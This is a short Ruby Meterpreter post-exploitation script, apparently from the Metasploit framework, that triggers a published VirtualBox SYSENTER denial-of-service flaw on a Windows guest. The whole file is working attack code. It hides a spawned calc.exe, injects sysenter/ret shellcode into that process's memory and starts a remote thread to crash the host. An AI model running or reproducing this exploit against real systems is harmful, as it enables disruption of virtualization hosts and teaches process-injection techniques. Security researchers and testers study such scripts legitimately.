# Meterpreter script for triggering the VirtualBox DoS published at:
# http://milw0rm.com/exploits/9323

opts = Rex::Parser::Arguments.new(
	"-h" => [ false,"Help menu." ]
)

opts.parse(args) { |opt, idx, val|
	case opt
	when "-h"
		print_line("virtualbox_sysenter_dos -- trigger the VirtualBox DoS published at http://milw0rm.com/exploits/9323")
		print_line("USAGE: run virtualbox_sysenter_dos")
		print_status(opts.usage)
		raise Rex::Script::Completed
	end
}

#check for proper Meterpreter Platform
def unsupported
	print_error("This version of Meterpreter is not supported with this Script!")
	raise Rex::Script::Completed
end
unsupported if client.platform !~ /win32|win64/i

# Spawn calculator
pid = client.sys.process.execute("calc.exe", nil, {'Hidden' => 'true'}).pid
print_status("Calculator PID is #{pid}")

calc = client.sys.process.open(pid, PROCESS_ALL_ACCESS)

# Allocate some memory
mem  = calc.memory.allocate(32)

print_status("Allocated memory at address #{"0x%.8x" % mem}")

# Write the trigger shellcode
# sysenter
# ret
calc.memory.write(mem, "\x0f\x34\xc3")

print_status("VirtualBox SYSENTER Denial of Service launching...")

# Create a new thread on the shellcode pointer
calc.thread.create(mem, 0)

print_status("VirtualBox SYSENTER Denial of Service delivered.")

